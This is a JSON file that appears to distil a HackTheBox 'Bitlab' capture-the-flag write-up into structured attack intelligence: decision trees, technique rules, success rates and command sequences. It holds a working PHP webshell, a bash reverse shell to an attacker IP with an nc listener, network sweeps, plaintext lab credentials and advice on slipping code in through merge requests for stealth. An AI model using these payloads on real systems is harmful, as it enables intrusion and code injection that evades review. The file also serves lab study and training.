@@ -1,0 +1,908 @@
+{
+  "writeup_id": "Htb_Bitlab",
+  "scenario_fingerprint": {
+    "scenario_name": "gitlab_credential_disclosure_webshell",
+    "primary_services": [
+      "http",
+      "ssh",
+      "postgresql"
+    ],
+    "port_signature": "22+80",
+    "service_combination": "ssh+nginx+gitlab",
+    "os_family": "linux",
+    "environment_type": "development_platform",
+    "entry_vector": "credential_disclosure",
+    "privilege_path": "webshell_to_database_to_ssh",
+    "attack_complexity": "medium",
+    "estimated_time": "60-90 minutes",
+    "scenario_confidence": 0.88,
+    "distinguishing_factors": [
+      "javascript_obfuscated_credentials",
+      "gitlab_help_page_modification",
+      "automated_deployment_pipeline",
+      "bookmarks_html_file"
+    ],
+    "environmental_clues": [
+      "gitlab_community_edition",
+      "custom_help_page_redirect",
+      "development_automation",
+      "postgresql_backend"
+    ],
+    "similar_scenarios": [
+      "laboratory_htb_easy",
+      "devops_gitlab_boxes"
+    ],
+    "unique_aspects": [
+      "bookmarks_bar_credential_injection",
+      "merge_to_master_auto_deployment",
+      "windows_executable_credential_extraction"
+    ]
+  },
+  "success_patterns": {
+    "success_factors": [
+      {
+        "technique": "Javascript Credential Extraction",
+        "success_reason": "Obfuscated credentials embedded in bookmarks.html file accessible via modified help link",
+        "prerequisite_indicators": [
+          "web_application_accessible",
+          "help_link_redirects_to_directory",
+          "bookmarks_file_present"
+        ],
+        "recognition_patterns": [
+          "javascript: protocol in href attributes",
+          "hex-encoded strings in javascript arrays",
+          "getElementById and value assignments",
+          "obfuscated variable names (_0x4b18)"
+        ],
+        "failure_modes": [
+          "help_link_properly_configured",
+          "no_credential_storage_in_bookmarks",
+          "proper_access_controls_on_help_directory"
+        ],
+        "environmental_factors": [
+          "default_gitlab_configuration",
+          "misconfigured_help_redirect",
+          "developer_convenience_over_security"
+        ],
+        "success_probability": 0.92,
+        "typical_timeframe": "10-20 minutes"
+      },
+      {
+        "technique": "GitLab Webhook Code Injection",
+        "success_reason": "Automated deployment via webhook triggers sudo git pull on merge to master",
+        "prerequisite_indicators": [
+          "gitlab_instance_accessible",
+          "webhook_endpoint_exists",
+          "automated_deployment_configured"
+        ],
+        "recognition_patterns": [
+          "deployer project with webhook code",
+          "sudo git pull in webhook handler",
+          "merge request triggers deployment",
+          "profile project with writable access"
+        ],
+        "failure_modes": [
+          "no_webhook_automation",
+          "restricted_merge_permissions",
+          "code_review_required",
+          "deployment_user_restrictions"
+        ],
+        "environmental_factors": [
+          "ci_cd_automation_present",
+          "development_environment_practices",
+          "insufficient_deployment_security"
+        ],
+        "success_probability": 0.85,
+        "typical_timeframe": "15-30 minutes"
+      }
+    ],
+    "critical_discoveries": [
+      {
+        "discovery": "Obfuscated credentials in bookmarks.html",
+        "discovery_method": "Help link directory traversal and javascript deobfuscation",
+        "why_critical": "Provided initial GitLab access enabling code injection path",
+        "how_to_recognize": [
+          "help links redirecting to file listings",
+          "javascript bookmarks with hex encoding",
+          "getElementById patterns in obfuscated code"
+        ],
+        "follow_up_actions": [
+          "deobfuscate_javascript_credentials",
+          "test_gitlab_login",
+          "enumerate_accessible_projects"
+        ]
+      },
+      {
+        "discovery": "Automated deployment webhook system",
+        "discovery_method": "GitLab project enumeration and code review",
+        "why_critical": "Enabled code execution via merge request automation",
+        "how_to_recognize": [
+          "deployer project with webhook handler",
+          "sudo git pull in deployment script",
+          "merge request automation comments"
+        ],
+        "follow_up_actions": [
+          "create_webshell_in_profile_project",
+          "submit_merge_request_to_master",
+          "access_deployed_webshell"
+        ]
+      },
+      {
+        "discovery": "PostgreSQL credentials in snippets",
+        "discovery_method": "GitLab snippets enumeration",
+        "why_critical": "Database access for credential harvesting and privilege escalation",
+        "how_to_recognize": [
+          "database connection strings in snippets",
+          "hardcoded credentials in code",
+          "profiles database references"
+        ],
+        "follow_up_actions": [
+          "connect_to_postgresql_database",
+          "enumerate_profiles_table",
+          "extract_user_credentials"
+        ]
+      }
+    ],
+    "escalation_keys": [
+      {
+        "privilege_level": "www-data",
+        "escalation_method": "Database_credential_extraction",
+        "why_possible": "PostgreSQL database contains user credentials for SSH access",
+        "recognition_signs": [
+          "database_connection_from_webshell",
+          "profiles_table_accessible",
+          "user_credentials_in_database"
+        ],
+        "exploitation_path": "Webshell → PostgreSQL → SSH credentials → User shell"
+      },
+      {
+        "privilege_level": "user",
+        "escalation_method": "Windows_executable_reverse_engineering",
+        "why_possible": "Windows executable contains embedded credentials for root access",
+        "recognition_signs": [
+          "windows_executable_in_user_directory",
+          "putty_related_strings",
+          "embedded_credential_patterns"
+        ],
+        "exploitation_path": "Reverse engineer executable → Extract root credentials → SSH as root"
+      }
+    ]
+  },
+  "decision_tree": {
+    "decision_points": [
+      {
+        "step": 1,
+        "situation": "Found ports 22,80 open on Linux host with GitLab instance",
+        "decision": "Enumerate GitLab for credential disclosure and access vectors",
+        "reasoning": "GitLab instances often contain sensitive information and have known attack vectors",
+        "confidence": 0.9,
+        "alternatives": [
+          {
+            "option": "ssh_bruteforce",
+            "when": "if no web vulnerabilities found"
+          },
+          {
+            "option": "default_credentials",
+            "when": "if standard GitLab defaults work"
+          }
+        ],
+        "success_indicators": [
+          "gitlab_version_identified",
+          "help_pages_accessible",
+          "credential_disclosure_found"
+        ],
+        "next_decision": "analyze_credential_disclosure"
+      },
+      {
+        "step": 2,
+        "situation": "Found obfuscated JavaScript with credentials in help/bookmarks.html",
+        "decision": "Deobfuscate JavaScript to extract credentials",
+        "reasoning": "JavaScript obfuscation often hides credentials or sensitive data",
+        "confidence": 0.95,
+        "prerequisites": [
+          "javascript_code_found",
+          "obfuscation_detected"
+        ],
+        "success_indicators": [
+          "credentials_extracted",
+          "login_successful"
+        ],
+        "failure_fallbacks": [
+          "manual_javascript_execution",
+          "browser_bookmark_method"
+        ]
+      },
+      {
+        "step": 3,
+        "situation": "Authenticated to GitLab with valid credentials",
+        "decision": "Enumerate projects and look for deployment automation",
+        "reasoning": "GitLab projects often contain webhooks and CI/CD that can be abused",
+        "confidence": 0.85,
+        "prerequisites": [
+          "gitlab_access_obtained"
+        ],
+        "success_indicators": [
+          "webhook_code_found",
+          "auto_deployment_identified",
+          "profile_page_accessible"
+        ],
+        "failure_fallbacks": [
+          "repository_enumeration",
+          "snippet_analysis",
+          "user_enumeration"
+        ]
+      },
+      {
+        "step": 4,
+        "situation": "Found webhook automation that pulls code changes to live server",
+        "decision": "Inject webshell via merge request to trigger auto-deployment",
+        "reasoning": "Webhook triggers sudo git pull on merge, allowing code execution",
+        "confidence": 0.9,
+        "prerequisites": [
+          "webhook_mechanism_understood",
+          "target_branch_identified"
+        ],
+        "success_indicators": [
+          "merge_request_accepted",
+          "webshell_accessible",
+          "command_execution_confirmed"
+        ],
+        "failure_fallbacks": [
+          "direct_file_upload",
+          "other_project_exploitation"
+        ]
+      }
+    ],
+    "branching_logic": {
+      "if_javascript_found": {
+        "action": "deobfuscate_and_extract_credentials",
+        "tools": [
+          "browser_console",
+          "javascript_beautifier",
+          "manual_analysis"
+        ],
+        "next_phase": "gitlab_authentication"
+      },
+      "if_gitlab_access_obtained": {
+        "action": "enumerate_projects_and_automation",
+        "alternatives": [
+          "webhook_analysis",
+          "snippet_enumeration",
+          "project_code_review"
+        ],
+        "decision_criteria": "based_on_available_projects_and_permissions"
+      },
+      "if_webhook_automation_found": {
+        "action": "exploit_via_code_injection",
+        "purpose": "achieve_remote_code_execution",
+        "tools": [
+          "git_merge_request",
+          "webshell_payload"
+        ]
+      },
+      "if_webshell_deployed": {
+        "action": "establish_reverse_shell",
+        "purpose": "gain_interactive_access",
+        "tools": [
+          "nc",
+          "bash",
+          "python"
+        ]
+      }
+    },
+    "optimization_rules": [
+      {
+        "rule": "always_check_help_pages_for_credential_disclosure",
+        "reasoning": "help_pages_often_contain_sensitive_information_or_misconfigurations",
+        "applicability": "web_applications_with_help_sections"
+      },
+      {
+        "rule": "prioritize_webhook_and_automation_analysis_in_gitlab",
+        "reasoning": "gitlab_webhooks_frequently_lead_to_rce_via_auto_deployment",
+        "applicability": "gitlab_instances_with_project_access"
+      },
+      {
+        "rule": "use_merge_requests_over_direct_commits_for_stealth",
+        "reasoning": "merge_requests_appear_more_legitimate_and_trigger_proper_webhooks",
+        "applicability": "git_based_exploitation"
+      },
+      {
+        "rule": "enumerate_snippets_for_database_credentials",
+        "reasoning": "snippets_often_contain_hardcoded_credentials_for_privilege_escalation",
+        "applicability": "gitlab_instances_with_snippet_access"
+      }
+    ]
+  },
+  "applicability_rules": {
+    "technique_rules": [
+      {
+        "technique": "GitLab_Credential_Extraction",
+        "mitre_id": "T1552.001",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          80,
+          443
+        ],
+        "os_requirements": [
+          "linux",
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "gitlab_instance_detected",
+          "help_page_accessible",
+          "custom_bookmarks_file_present"
+        ],
+        "success_indicators": [
+          "bookmarks_html_file_found",
+          "javascript_obfuscated_credentials",
+          "gitlab_login_bookmark_present"
+        ],
+        "incompatible_with": [
+          "default_gitlab_help_page",
+          "authentication_required_for_help",
+          "custom_help_removed"
+        ],
+        "confidence_boosters": [
+          "directory_listing_enabled",
+          "javascript_credential_encoding",
+          "bookmark_functionality_intact"
+        ],
+        "typical_success_rate": 0.95,
+        "estimated_time": "2-5 minutes"
+      },
+      {
+        "technique": "GitLab_Code_Repository_Exploitation",
+        "mitre_id": "T1190",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          80,
+          443
+        ],
+        "os_requirements": [
+          "linux",
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "gitlab_authenticated_access",
+          "merge_automation_enabled",
+          "web_accessible_repository"
+        ],
+        "success_indicators": [
+          "merge_to_master_triggers_deployment",
+          "web_shell_upload_successful",
+          "code_execution_achieved"
+        ],
+        "incompatible_with": [
+          "manual_deployment_only",
+          "restricted_merge_permissions",
+          "code_review_required"
+        ],
+        "confidence_boosters": [
+          "ci_cd_pipeline_present",
+          "automatic_deployment_configured",
+          "web_root_accessible"
+        ],
+        "typical_success_rate": 0.85,
+        "estimated_time": "10-20 minutes"
+      },
+      {
+        "technique": "Database_Credential_Extraction",
+        "mitre_id": "T1552.001",
+        "required_services": [
+          "postgresql",
+          "mysql"
+        ],
+        "required_ports": [
+          5432,
+          3306
+        ],
+        "os_requirements": [
+          "linux",
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "database_accessible",
+          "web_application_credentials",
+          "user_table_present"
+        ],
+        "success_indicators": [
+          "database_connection_successful",
+          "user_credentials_found",
+          "password_hashes_extracted"
+        ],
+        "incompatible_with": [
+          "database_network_isolation",
+          "encrypted_credential_storage",
+          "no_user_tables"
+        ],
+        "confidence_boosters": [
+          "default_database_configuration",
+          "plaintext_passwords",
+          "predictable_table_names"
+        ],
+        "typical_success_rate": 0.8,
+        "estimated_time": "5-10 minutes"
+      }
+    ],
+    "environmental_detectors": {
+      "gitlab_instance": {
+        "port_indicators": [
+          80,
+          443
+        ],
+        "service_indicators": [
+          "http",
+          "https",
+          "nginx"
+        ],
+        "banner_indicators": [
+          "GitLab",
+          "Sign in · GitLab"
+        ],
+        "path_indicators": [
+          "/users/sign_in",
+          "/help",
+          "/api"
+        ],
+        "confidence_threshold": 0.9
+      },
+      "web_application": {
+        "port_indicators": [
+          80,
+          443,
+          8080,
+          8443
+        ],
+        "service_indicators": [
+          "http",
+          "https"
+        ],
+        "technology_indicators": [
+          "nginx",
+          "apache",
+          "iis"
+        ],
+        "confidence_threshold": 0.85
+      },
+      "database_service": {
+        "port_indicators": [
+          5432,
+          3306,
+          1433
+        ],
+        "service_indicators": [
+          "postgresql",
+          "mysql",
+          "mssql"
+        ],
+        "banner_indicators": [
+          "PostgreSQL",
+          "MySQL",
+          "Microsoft SQL Server"
+        ],
+        "confidence_threshold": 0.85
+      }
+    },
+    "attack_prioritization": {
+      "high_priority": [
+        {
+          "attack": "gitlab_credential_extraction",
+          "when": "gitlab_instance_detected",
+          "reason": "often_leads_to_authenticated_access"
+        },
+        {
+          "attack": "directory_enumeration",
+          "when": "web_service_detected",
+          "reason": "reveals_hidden_files_and_directories"
+        }
+      ],
+      "medium_priority": [
+        {
+          "attack": "database_enumeration",
+          "when": "database_service_detected",
+          "reason": "may_contain_user_credentials"
+        },
+        {
+          "attack": "ssh_credential_reuse",
+          "when": "ssh_service_detected",
+          "reason": "credentials_often_reused_across_services"
+        }
+      ]
+    }
+  },
+  "technique_intelligence": {
+    "techniques": [
+      {
+        "name": "JavaScript Credential Extraction",
+        "mitre_id": "T1552.001",
+        "category": "credential_access",
+        "phase": "initial_access",
+        "tools_used": [
+          {
+            "name": "browser_bookmarks",
+            "command_template": "Right-click link -> Bookmark -> Use on target page",
+            "actual_command": "Bookmarked javascript link and clicked on GitLab login page",
+            "output_pattern": "Credentials auto-filled in form fields",
+            "effectiveness_rating": 5,
+            "reliability": 0.98
+          },
+          {
+            "name": "javascript_deobfuscation",
+            "command_template": "console.log(\"document[\" + _0x4b18[2] + \"](\" + _0x4b18[1] + \")[\" + _0x4b18[0] + \"] = \" + _0x4b18[3] + \";\");",
+            "actual_command": "Manual deobfuscation of hex-encoded strings in JavaScript array",
+            "success_factors": [
+              "hex_encoded_strings",
+              "simple_obfuscation"
+            ],
+            "effectiveness_rating": 4
+          }
+        ],
+        "prerequisites": [
+          "access_to_bookmarks_html_file",
+          "javascript_execution_capability"
+        ],
+        "success_indicators": [
+          "credentials_extracted_successfully",
+          "login_successful_with_extracted_creds"
+        ],
+        "common_failures": [
+          "complex_obfuscation_methods",
+          "dynamic_credential_generation"
+        ],
+        "follow_up_techniques": [
+          "gitlab_enumeration",
+          "repository_analysis",
+          "webhook_exploitation"
+        ],
+        "time_investment": "5-15 minutes",
+        "skill_level": "beginner"
+      },
+      {
+        "name": "GitLab Webhook Code Injection",
+        "mitre_id": "T1505.003",
+        "category": "persistence",
+        "phase": "initial_access",
+        "tools_used": [
+          {
+            "name": "gitlab_web_interface",
+            "command_template": "Edit file -> Add webshell -> Create merge request -> Merge to master",
+            "actual_command": "Added <?php if(isset($_GET['0xdf'])){echo shell_exec($_GET['0xdf']);} ?> to index.php",
+            "output_pattern": "Code execution via HTTP parameter",
+            "effectiveness_rating": 5,
+            "reliability": 0.95
+          }
+        ],
+        "prerequisites": [
+          "gitlab_access_with_developer_permissions",
+          "webhook_configured_for_automatic_deployment",
+          "target_application_accessible_via_web"
+        ],
+        "success_indicators": [
+          "merge_request_completed_successfully",
+          "webshell_accessible_via_http",
+          "command_execution_confirmed"
+        ],
+        "common_failures": [
+          "insufficient_gitlab_permissions",
+          "webhook_not_configured",
+          "code_review_process_blocks_malicious_code"
+        ],
+        "follow_up_techniques": [
+          "reverse_shell_establishment",
+          "privilege_escalation",
+          "lateral_movement"
+        ],
+        "time_investment": "10-20 minutes",
+        "skill_level": "intermediate"
+      },
+      {
+        "name": "Reverse Shell via Web Shell",
+        "mitre_id": "T1059.004",
+        "category": "execution",
+        "phase": "initial_access",
+        "tools_used": [
+          {
+            "name": "bash_reverse_shell",
+            "command_template": "bash -c 'bash -i >&/dev/tcp/{ip}/{port} 0>&1'",
+            "actual_command": "bash -c 'bash -i >& /dev/tcp/10.10.14.30/443 0>&1'",
+            "output_pattern": "Interactive shell connection established",
+            "effectiveness_rating": 5,
+            "reliability": 0.9
+          },
+          {
+            "name": "netcat_listener",
+            "command_template": "nc -lvnp {port}",
+            "actual_command": "nc -lvnp 443",
+            "success_factors": [
+              "target_can_reach_attacker",
+              "bash_available_on_target"
+            ],
+            "effectiveness_rating": 5
+          }
+        ],
+        "prerequisites": [
+          "webshell_access_established",
+          "network_connectivity_to_attacker",
+          "bash_shell_available"
+        ],
+        "success_indicators": [
+          "reverse_connection_established",
+          "interactive_shell_obtained",
+          "command_execution_confirmed"
+        ],
+        "common_failures": [
+          "firewall_blocking_outbound_connections",
+          "url_encoding_issues",
+          "shell_not_available"
+        ],
+        "follow_up_techniques": [
+          "privilege_escalation",
+          "credential_harvesting",
+          "lateral_movement"
+        ],
+        "time_investment": "2-5 minutes",
+        "skill_level": "beginner"
+      },
+      {
+        "name": "Container Network Reconnaissance",
+        "mitre_id": "T1018",
+        "category": "discovery",
+        "phase": "post_exploitation",
+        "tools_used": [
+          {
+            "name": "ip_neigh",
+            "command_template": "ip neigh",
+            "actual_command": "ip neigh",
+            "output_pattern": "ARP table showing container IPs",
+            "effectiveness_rating": 4,
+            "reliability": 0.95
+          },
+          {
+            "name": "ping_sweep",
+            "command_template": "for i in {1..254}; do (ping -c 1 {subnet}.$i | grep \"bytes from\" | cut -d':' -f1 | cut -d' ' -f4 &); done",
+            "actual_command": "for i in {1..254}; do (ping -c 1 172.19.0.$i | grep \"bytes from\" | cut -d':' -f1 | cut -d' ' -f4 &); done",
+            "success_factors": [
+              "icmp_allowed",
+              "containers_respond_to_ping"
+            ],
+            "effectiveness_rating": 4
+          },
+          {
+            "name": "nmap_container_scan",
+            "command_template": "nmap {ip_range}",
+            "actual_command": "nmap 172.19.0.2-5",
+            "output_pattern": "Open ports on container services",
+            "effectiveness_rating": 5
+          }
+        ],
+        "prerequisites": [
+          "shell_access_on_docker_host",
+          "network_tools_available"
+        ],
+        "success_indicators": [
+          "container_ips_identified",
+          "services_enumerated",
+          "attack_surface_mapped"
+        ],
+        "common_failures": [
+          "network_segmentation_blocking_access",
+          "tools_not_available",
+          "containers_not_responding"
+        ],
+        "follow_up_techniques": [
+          "service_exploitation",
+          "credential_extraction",
+          "database_enumeration"
+        ],
+        "time_investment": "5-10 minutes",
+        "skill_level": "intermediate"
+      }
+    ],
+    "tool_effectiveness": [
+      {
+        "tool": "GitLab",
+        "use_case": "code_injection_via_merge_requests",
+        "effectiveness_rating": 5,
+        "reliability": 0.95,
+        "learning_curve": "low",
+        "essential_for": [
+          "gitlab_environments",
+          "ci_cd_exploitation"
+        ],
+        "alternatives": [
+          "direct_file_upload",
+          "git_push"
+        ],
+        "best_practices": [
+          "use_feature_branches_for_stealth",
+          "clean_up_branches_after_merge",
+          "test_webshell_before_establishing_reverse_shell"
+        ]
+      },
+      {
+        "tool": "JavaScript Deobfuscation",
+        "use_case": "credential_extraction_from_obfuscated_code",
+        "effectiveness_rating": 4,
+        "reliability": 0.85,
+        "learning_curve": "medium",
+        "essential_for": [
+          "web_application_testing",
+          "client_side_analysis"
+        ],
+        "alternatives": [
+          "browser_developer_tools",
+          "online_deobfuscators"
+        ],
+        "best_practices": [
+          "use_browser_bookmarks_for_quick_execution",
+          "validate_extracted_credentials_immediately",
+          "analyze_hex_encoded_strings_systematically"
+        ]
+      }
+    ],
+    "command_sequences": [
+      {
+        "sequence_name": "gitlab_webshell_to_reverse_shell",
+        "steps": [
+          {
+            "step": 1,
+            "command": "Extract credentials from JavaScript: clave/11des0081x",
+            "purpose": "Obtain GitLab access credentials",
+            "expected_output": "Successful GitLab login"
+          },
+          {
+            "step": 2,
+            "command": "Edit Profile/index.php, add: <?php if(isset($_GET['0xdf'])){echo shell_exec($_GET['0xdf']);} ?>",
+            "purpose": "Inject webshell into application code",
+            "expected_output": "Code committed to feature branch"
+          },
+          {
+            "step": 3,
+            "command": "Create and merge pull request to master branch",
+            "purpose": "Trigger automatic deployment via webhook",
+            "expected_output": "Code deployed to production"
+          },
+          {
+            "step": 4,
+            "command": "nc -lvnp 443",
+            "purpose": "Set up reverse shell listener",
+            "expected_output": "Netcat listening on port 443"
+          },
+          {
+            "step": 5,
+            "command": "Visit: http://10.10.10.114/profile/?0xdf=bash -c 'bash -i >%26 /dev/tcp/10.10.14.30/443 0>%261'",
+            "purpose": "Execute reverse shell command",
+            "expected_output": "Interactive shell as www-data"
+          }
+        ],
+        "success_rate": 0.92,
+        "typical_duration": "15-30 minutes"
+      },
+      {
+        "sequence_name": "container_network_discovery",
+        "steps": [
+          {
+            "step": 1,
+            "command": "ip neigh",
+            "purpose": "Identify container network neighbors",
+            "expected_output": "ARP table with container IPs"
+          },
+          {
+            "step": 2,
+            "command": "for i in {1..254}; do (ping -c 1 172.19.0.$i | grep \"bytes from\" | cut -d':' -f1 | cut -d' ' -f4 &); done",
+            "purpose": "Discover active containers via ping sweep",
+            "expected_output": "List of responsive container IPs"
+          },
+          {
+            "step": 3,
+            "command": "nmap 172.19.0.2-5",
+            "purpose": "Enumerate services on discovered containers",
+            "expected_output": "Open ports and services on containers"
+          }
+        ],
+        "success_rate": 0.88,
+        "typical_duration": "5-10 minutes"
+      }
+    ]
+  },
+  "metadata": {
+    "basic_metadata": {
+      "name": "Bitlab",
+      "difficulty": "Medium",
+      "os": "Linux Ubuntu",
+      "platform": "HackTheBox",
+      "release_date": "2019-09-07",
+      "author": "Frey & thek",
+      "estimated_time": "2-3 hours"
+    },
+    "intelligence_metadata": {
+      "attack_complexity": "medium",
+      "skill_level_required": "intermediate",
+      "primary_attack_vectors": [
+        "web_application",
+        "source_code_analysis",
+        "automation_abuse"
+      ],
+      "key_vulnerabilities": [
+        "credential_exposure",
+        "ci_cd_abuse",
+        "database_credentials"
+      ],
+      "environment_type": "development_environment",
+      "real_world_relevance": "very_high",
+      "learning_value": [
+        "gitlab_exploitation",
+        "ci_cd_security",
+        "reverse_engineering",
+        "automation_abuse"
+      ],
+      "prerequisite_knowledge": [
+        "web_application_testing",
+        "git_workflows",
+        "basic_reverse_engineering"
+      ]
+    },
+    "categorization": {
+      "primary_category": "web_application",
+      "subcategories": [
+        "source_code_review",
+        "ci_cd_exploitation",
+        "reverse_engineering"
+      ],
+      "attack_types": [
+        "credential_access",
+        "code_injection",
+        "privilege_escalation"
+      ],
+      "defensive_lessons": [
+        "secure_ci_cd_pipelines",
+        "credential_management",
+        "access_controls",
+        "code_review_processes"
+      ]
+    },
+    "similarity_markers": {
+      "similar_boxes": [
+        "Laboratory",
+        "Devzat",
+        "Forge"
+      ],
+      "similarity_reasons": [
+        "development_environments",
+        "source_code_access",
+        "automation_exploitation"
+      ],
+      "unique_aspects": [
+        "gitlab_instance",
+        "javascript_encoded_credentials",
+        "windows_executable_analysis"
+      ],
+      "difficulty_factors": [
+        "multiple_attack_phases",
+        "reverse_engineering_required",
+        "automation_understanding"
+      ]
+    }
+  },
+  "extraction_metadata": {
+    "parse_date": "2025-07-05T03:47:48.672988",
+    "original_file": "0xdf_writeups/Htb Bitlab.md",
+    "content_length": 29466,
+    "extraction_version": "2.0-claude",
+    "model_used": "claude-sonnet-4-20250514"
+  },
+  "intelligence_confidence": 0.9166666666666667,
+  "quality_breakdown": {
+    "scenario_uniqueness": 1.0,
+    "success_logic_clarity": 0.6666666666666666,
+    "applicability_completeness": 1.0,
+    "decision_tree_depth": 1.0,
+    "technique_actionability": 1.0
+  }
+}
